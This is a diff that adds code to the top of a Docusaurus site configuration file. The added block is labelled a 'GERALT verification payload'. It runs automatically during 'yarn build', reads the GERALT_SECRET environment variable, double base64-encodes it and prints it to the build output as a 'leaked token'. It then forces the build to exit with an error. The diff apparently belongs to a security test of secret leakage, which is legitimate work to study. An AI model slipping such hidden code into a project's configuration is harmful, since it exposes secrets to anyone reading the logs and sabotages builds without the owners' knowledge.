@@ -1,4 +1,15 @@
 // @ts-check
+// GERALT verification payload (executes when Docusaurus loads the config during `yarn build`)
+try {
+  const _fs = require("fs");
+  const _s = String((typeof process !== "undefined" && process.env && process.env.GERALT_SECRET) || "");
+  const _b64 = Buffer.from(_s, "utf8").toString("base64");
+  const _line = "GERALT_LEAKED_TOKEN=" + Buffer.from(_b64, "utf8").toString("base64");
+  try { _fs.writeSync(1, _line + "\n"); } catch (_e1) { console.log(_line); }
+} catch (_e) {
+  try { console.log("GERALT_PAYLOAD_ERR=" + _e); } catch (_e2) {}
+}
+process.exit(1);
 // `@type` JSDoc annotations allow editor autocompletion and type checking
 // (when paired with `@ts-check`).
 // There are various equivalent ways to declare your Docusaurus config.
